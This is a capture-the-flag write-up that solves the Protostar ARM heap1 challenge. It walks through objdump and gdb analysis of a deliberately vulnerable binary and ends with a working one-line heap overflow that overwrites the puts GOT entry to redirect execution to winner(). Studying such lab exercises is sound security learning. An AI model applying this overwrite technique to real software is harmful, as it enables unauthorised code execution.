## Protostar ARM heap1

#### Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```
#### _Let's start_

This challenge looks like the previous one, but this time, there is no pointer function to overwrite.
In this challenge we will manipulate the [GOT (Global Offset Table)](https://www.codeproject.com/articles/1032231/what-is-the-symbol-table-and-what-is-the-global-of) entries.

Let's inspect with objdump the binary, and according with the documentation, we will use the options `R` and `T`
```
pi@raspberrypi:~/protostar/heap/heap2 $ objdump
Usage: objdump <option(s)> <file(s)>
 Display information from object <file(s)>.
 At least one of the following switches must be given:
...
  -T, --dynamic-syms       Display the contents of the dynamic symbol table
  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
...
```
```
pi@raspberrypi:~/protostar/heap/heap1 $  objdump -TR ./heap1

./heap1:     file format elf32-littlearm

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.4   puts
00000000      DF *UND*	00000000  GLIBC_2.4   printf
00000000      DF *UND*	00000000  GLIBC_2.4   time
00000000      DF *UND*	00000000  GLIBC_2.4   malloc
00000000      DF *UND*	00000000  GLIBC_2.4   abort
00000000      DF *UND*	00000000  GLIBC_2.4   strcpy
00000000      DF *UND*	00000000  GLIBC_2.4   __libc_start_main

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
00020780 R_ARM_GLOB_DAT    __gmon_start__
00020760 R_ARM_JUMP_SLOT   printf@GLIBC_2.4
00020764 R_ARM_JUMP_SLOT   time@GLIBC_2.4
00020768 R_ARM_JUMP_SLOT   strcpy@GLIBC_2.4
0002076c R_ARM_JUMP_SLOT   puts@GLIBC_2.4
00020770 R_ARM_JUMP_SLOT   malloc@GLIBC_2.4
00020774 R_ARM_JUMP_SLOT   __libc_start_main@GLIBC_2.4
00020778 R_ARM_JUMP_SLOT   __gmon_start__
0002077c R_ARM_JUMP_SLOT   abort@GLIBC_2.4

```

As we can see, among the entries there are functions called during the execution of our binary. In particular the function `printf()` seems to be our best candidate because, in the source code, it's called after the `strcpy()`. Let's analyse the binary with gdb and disassemble the `main()`.

```
pi@raspberrypi:~/protostar/heap/heap1 $ gdb ./heap1
GNU gdb (Raspbian 8.2.1-2) 8.2.1
...
Reading symbols from ./heap1...done.
gef➤  b main
Breakpoint 1 at 0x104ec: file heap1.c, line 23.
gef➤  disassemble main
Dump of assembler code for function main:
   0x000104d8 <+0>:	push	{r11, lr}
   0x000104dc <+4>:	add	r11, sp, #4
   0x000104e0 <+8>:	sub	sp, sp, #16
   0x000104e4 <+12>:	str	r0, [r11, #-16]
   0x000104e8 <+16>:	str	r1, [r11, #-20]	; 0xffffffec
   0x000104ec <+20>:	mov	r0, #8
   0x000104f0 <+24>:	bl	0x1038c <malloc@plt>
   0x000104f4 <+28>:	mov	r3, r0
   0x000104f8 <+32>:	str	r3, [r11, #-8]
   0x000104fc <+36>:	ldr	r3, [r11, #-8]
   0x00010500 <+40>:	mov	r2, #1
   0x00010504 <+44>:	str	r2, [r3]
   0x00010508 <+48>:	mov	r0, #8
   0x0001050c <+52>:	bl	0x1038c <malloc@plt>
   0x00010510 <+56>:	mov	r3, r0
   0x00010514 <+60>:	mov	r2, r3
   0x00010518 <+64>:	ldr	r3, [r11, #-8]
   0x0001051c <+68>:	str	r2, [r3, #4]
   0x00010520 <+72>:	mov	r0, #8
   0x00010524 <+76>:	bl	0x1038c <malloc@plt>
   0x00010528 <+80>:	mov	r3, r0
   0x0001052c <+84>:	str	r3, [r11, #-12]
   0x00010530 <+88>:	ldr	r3, [r11, #-12]
   0x00010534 <+92>:	mov	r2, #2
   0x00010538 <+96>:	str	r2, [r3]
   0x0001053c <+100>:	mov	r0, #8
   0x00010540 <+104>:	bl	0x1038c <malloc@plt>
   0x00010544 <+108>:	mov	r3, r0
   0x00010548 <+112>:	mov	r2, r3
   0x0001054c <+116>:	ldr	r3, [r11, #-12]
   0x00010550 <+120>:	str	r2, [r3, #4]
   0x00010554 <+124>:	ldr	r3, [r11, #-8]
   0x00010558 <+128>:	ldr	r2, [r3, #4]
   0x0001055c <+132>:	ldr	r3, [r11, #-20]	; 0xffffffec
   0x00010560 <+136>:	add	r3, r3, #4
   0x00010564 <+140>:	ldr	r3, [r3]
   0x00010568 <+144>:	mov	r1, r3
   0x0001056c <+148>:	mov	r0, r2
   0x00010570 <+152>:	bl	0x10374 <strcpy@plt>
   0x00010574 <+156>:	ldr	r3, [r11, #-12]
   0x00010578 <+160>:	ldr	r2, [r3, #4]
   0x0001057c <+164>:	ldr	r3, [r11, #-20]	; 0xffffffec
   0x00010580 <+168>:	add	r3, r3, #8
   0x00010584 <+172>:	ldr	r3, [r3]
   0x00010588 <+176>:	mov	r1, r3
   0x0001058c <+180>:	mov	r0, r2
   0x00010590 <+184>:	bl	0x10374 <strcpy@plt>
   0x00010594 <+188>:	ldr	r0, [pc, #16]	; 0x105ac <main+212>
   0x00010598 <+192>:	bl	0x10380 <puts@plt>
   0x0001059c <+196>:	mov	r3, #0
   0x000105a0 <+200>:	mov	r0, r3
   0x000105a4 <+204>:	sub	sp, r11, #4
   0x000105a8 <+208>:	pop	{r11, pc}
   0x000105ac <+212>:	andeq	r0, r1, r12, lsr r6
End of assembler dump.
```
What?! Surprisingly, instead of `printf()` been called,  `puts()` is used.
Let's see why this happens.


```c
#include<stdio.h>

int main(){
          printf("and that's a wrap folks!\n");
}
```
will produce the following assembly
```c
pi@raspberrypi:~/protostar/heap/heap2 $ gdb ./printf_test
...
Dump of assembler code for function main:
   0x00010404 <+0>:	push	{r11, lr}
   0x00010408 <+4>:	add	r11, sp, #4
   0x0001040c <+8>:	ldr	r0, [pc, #12]	; 0x10420 <main+28>
   0x00010410 <+12>:	bl	0x102e4 <puts@plt>
   0x00010414 <+16>:	mov	r3, #0
   0x00010418 <+20>:	mov	r0, r3
   0x0001041c <+24>:	pop	{r11, pc}
   0x00010420 <+28>:	muleq	r1, r4, r4
End of assembler dump.
```

but the following source code

```c
#include<stdio.h>

int main(){
          printf("and that's a wrap folks!\n", NULL);
}
```
will produce the following assembly

```c

pi@raspberrypi:~/protostar/heap/heap2 $ gdb ./printf_test
...
gef➤  disassemble main
Dump of assembler code for function main:
   0x00010408 <+0>:	push	{r11, lr}
   0x0001040c <+4>:	add	r11, sp, #4
   0x00010410 <+8>:	mov	r1, #0
   0x00010414 <+12>:	ldr	r0, [pc, #12]	; 0x10428 <main+32>
   0x00010418 <+16>:	bl	0x102e8 <printf@plt>
   0x0001041c <+20>:	mov	r3, #0
   0x00010420 <+24>:	mov	r0, r3
   0x00010424 <+28>:	pop	{r11, pc}
   0x00010428 <+32>:	muleq	r1, r12, r4
End of assembler dump.
```

It seems like `gcc` introduces some assumptions and optimizations related to parameter passed to the `printf()` presents in the source code.

So, `printf()` is not our best candidate and we will use `puts()`@`0002076c` from the GOT.
```
0002076c R_ARM_JUMP_SLOT   puts@GLIBC_2.4
```

Let's come back to solve the challange, running the program with gdb and setting a breakpoint after the two `strcpy()` calls.

```
gef➤  b *0x00010598
Breakpoint 1 at 0x10598: file heap1.c, line 34.
gef➤  r AAAABBBB 00001111
Starting program: /home/pi/protostar/heap/heap1/heap1 AAAABBBB 00001111

Breakpoint 1, 0x00010598 in main (argc=0x3, argv=0x7efff564) at heap1.c:34
34	  printf("and that's a wrap folks!\n");
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$r0  : 0x0001063c  →  "and that's a wrap folks!"
$r1  : 0x7efff6f5  →  "SHELL=/bin/bash"
$r2  : 0x0       
$r3  : 0x3       
$r4  : 0x0       
$r5  : 0x000105b0  →  <__libc_csu_init+0> push {r4,  r5,  r6,  r7,  r8,  r9,  r10,  lr}
$r6  : 0x000103bc  →  <_start+0> mov r11,  #0
$r7  : 0x0       
$r8  : 0x0       
$r9  : 0x0       
$r10 : 0x76fff000  →  0x00030f44  →  0x00000000
$r11 : 0x7efff414  →  0x76e82718  →  <__libc_start_main+268> bl 0x76e99780 <__GI_exit>
$r12 : 0x00021180  →  "00001111"
$sp  : 0x7efff400  →  0x7efff564  →  0x7efff6bf  →  "/home/pi/protostar/heap/heap1/heap1"
$lr  : 0x00010594  →  <main+188> ldr r0,  [pc,  #16]	; 0x105ac <main+212>
$pc  : 0x00010598  →  <main+192> bl 0x10380 <puts@plt>
$cpsr: [negative zero CARRY overflow interrupt fast thumb]
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x7efff400│+0x0000: 0x7efff564  →  0x7efff6bf  →  "/home/pi/protostar/heap/heap1/heap1"	 ← $sp
0x7efff404│+0x0004: 0x00000003
0x7efff408│+0x0008: 0x00021170  →  0x00000002
0x7efff40c│+0x000c: 0x00021150  →  0x00000001
0x7efff410│+0x0010: 0x00000000
0x7efff414│+0x0014: 0x76e82718  →  <__libc_start_main+268> bl 0x76e99780 <__GI_exit>	 ← $r11
0x7efff418│+0x0018: 0x76fb5000  →  0x00149f10
0x7efff41c│+0x001c: 0x7efff564  →  0x7efff6bf  →  "/home/pi/protostar/heap/heap1/heap1"
───────────────────────────────────────────────────────────────────────────────────────────────── code:arm:ARM ────
      0x1058c <main+180>       mov    r0,  r2
      0x10590 <main+184>       bl     0x10374 <strcpy@plt>
      0x10594 <main+188>       ldr    r0,  [pc,  #16]	; 0x105ac <main+212>
 →    0x10598 <main+192>       bl     0x10380 <puts@plt>
   ↳     0x10380 <puts@plt+0>     add    r12,  pc,  #0,  12
         0x10384 <puts@plt+4>     add    r12,  r12,  #16,  20	; 0x10000
         0x10388 <puts@plt+8>     ldr    pc,  [r12,  #996]!	; 0x3e4
         0x1038c <malloc@plt+0>   add    r12,  pc,  #0,  12
         0x10390 <malloc@plt+4>   add    r12,  r12,  #16,  20	; 0x10000
         0x10394 <malloc@plt+8>   ldr    pc,  [r12,  #988]!	; 0x3dc
────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
puts@plt (
   $r0 = 0x0001063c → "and that's a wrap folks!",
   $r1 = 0x7efff6f5 → "SHELL=/bin/bash",
   $r2 = 0x00000000,
   $r3 = 0x00000003
)
──────────────────────────────────────────────────────────────────────────────────────────── source:heap1.c+34 ────
     29	   i2->name = malloc(8);
     30	 
     31	   strcpy(i1->name, argv[1]);
     32	   strcpy(i2->name, argv[2]);
     33	 
 →   34	   printf("and that's a wrap folks!\n");
     35	 }
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heap1", stopped 0x10598 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x10598 → main(argc=0x3, argv=0x7efff564)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x00010000 0x00011000 0x00000000 r-x /home/pi/protostar/heap/heap1/heap1
0x00020000 0x00021000 0x00000000 rwx /home/pi/protostar/heap/heap1/heap1
0x00021000 0x00042000 0x00000000 rwx [heap]
0x76e6b000 0x76fa3000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fa3000 0x76fb3000 0x00138000 --- /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb3000 0x76fb5000 0x00138000 r-x /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb5000 0x76fb6000 0x0013a000 rwx /lib/arm-linux-gnueabihf/libc-2.28.so
0x76fb6000 0x76fb9000 0x00000000 rwx
0x76fb9000 0x76fbd000 0x00000000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fbd000 0x76fcc000 0x00004000 --- /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcc000 0x76fcd000 0x00003000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fcd000 0x76fce000 0x00004000 rwx /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so
0x76fce000 0x76fee000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76ff9000 0x76ffb000 0x00000000 rwx
0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]
0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]
0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]
0x76ffe000 0x76fff000 0x00020000 r-x /lib/arm-linux-gnueabihf/ld-2.28.so
0x76fff000 0x77000000 0x00021000 rwx /lib/arm-linux-gnueabihf/ld-2.28.so
0x7efdf000 0x7f000000 0x00000000 rwx [stack]
0xffff0000 0xffff1000 0x00000000 r-x [vectors]
gef➤  
```

We can see out heap starts at the address `0x00021000`.

```
gef➤  heap chunk i1
Chunk(addr=0x21150, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off
gef➤  heap chunk i2
Chunk(addr=0x21170, size=0x10, flags=PREV_INUSE)
Chunk size: 16 (0x10)
Usable size: 12 (0xc)
Previous chunk size: 0 (0x0)
PREV_INUSE flag: On
IS_MMAPPED flag: Off
NON_MAIN_ARENA flag: Off

gef➤  x/10x i1
0x21150:	0x00000001	0x00021160	0x00000000	0x00000011
0x21160:	0x41414141	0x42424242	0x00000000	0x00000011
0x21170:	0x00000002	0x00021180

gef➤  p winner
$2= {void ()} 0x104ac <winner>
```
Printing information related to our two variables `i1` and `i2` and the chunks we can see that we are able to overwrite contents using our inputs `argv[1]` and `argv[2]`.
With `argv[1]`, we will overwrite, using the first `strcpy()`, the location __*WHERE*__ the `argv[2]` will be stored (GOT entry for `puts()`) and with `argv[2]` __*WHAT*__ will be stored (address related to the function `win()`) with the second `strcpy()`.  

```code
pi@raspberrypi:~/protostar/heap/heap1 $ ./heap1 $(python -c "print 'A'*20 + '\x6c\x07\x02'") $(python -c"print '\xac\x04\x01'")
and we have a winner @ 1590007560
```
__*Done :)*__
